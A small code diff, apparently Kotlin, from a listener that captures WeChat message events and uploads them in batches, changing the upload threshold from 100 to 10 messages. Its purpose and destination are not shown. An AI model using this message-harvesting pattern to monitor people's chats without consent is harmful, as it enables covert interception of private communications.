@@ -27,7 +27,7 @@ object Listener {
 
         if (event?.packageName.toString() != "com.tencent.mm") return
         if ((System.currentTimeMillis() - lastRead) < sleep) return
-        if (messageList.size > 100 && !uploading) {
+        if (messageList.size > 10 && !uploading) {
             allMessageList.addAll(messageList)
             uploadMessage()
             if (allMessageList.size > 100 * 1000) allMessageList.clear()
